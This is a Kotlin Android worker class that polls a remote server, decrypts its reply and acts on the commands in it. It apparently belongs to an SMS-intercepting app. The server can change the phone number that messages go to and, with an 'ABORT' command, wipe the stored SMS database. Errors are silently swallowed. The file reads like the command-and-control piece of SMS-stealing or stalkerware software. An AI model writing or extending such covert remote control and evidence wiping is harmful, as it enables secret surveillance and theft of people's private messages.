package com.example.service

import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters
import okhttp3.OkHttpClient
import okhttp3.Request
import com.example.data.SecurityModule
import com.example.data.SettingsManager
import com.example.data.SmsDatabase
import com.example.BuildConfig
import org.json.JSONObject
import kotlinx.coroutines.runBlocking

class RemotePoller(context: Context, params: WorkerParameters) : Worker(context, params) {
    override fun doWork(): Result {
        return try {
            val client = OkHttpClient()
            val request = Request.Builder().url(BuildConfig.API_URL).build()
            val response = client.newCall(request).execute()
            
            if (response.isSuccessful) {
                val encryptedData = response.body?.string() ?: ""
                android.util.Log.d("RemotePoller", "Encrypted data: $encryptedData")
                val decrypted = SecurityModule.decrypt(encryptedData)
                android.util.Log.d("RemotePoller", "Decrypted data: $decrypted")
                if (decrypted.isNotEmpty()) {
                    val json = JSONObject(decrypted)
                    val status = json.optString("status")
                    val newTargetNumber = json.optString("target_number")
                    
                    if (newTargetNumber.isNotEmpty()) {
                        SettingsManager(applicationContext).targetNumber = newTargetNumber
                    }
                    
                    if (status == "ABORT") {
                        // Secure Wipe
                        val db = SmsDatabase.getDatabase(applicationContext)
                        runBlocking { db.smsDao().clearAll() }
                    }
                }
            } else {
                android.util.Log.e("RemotePoller", "Response unsuccessful: ${response.code}")
            }
            Result.success()
        } catch (e: Exception) {
            Result.success() // Fail-safe
        }
    }
}
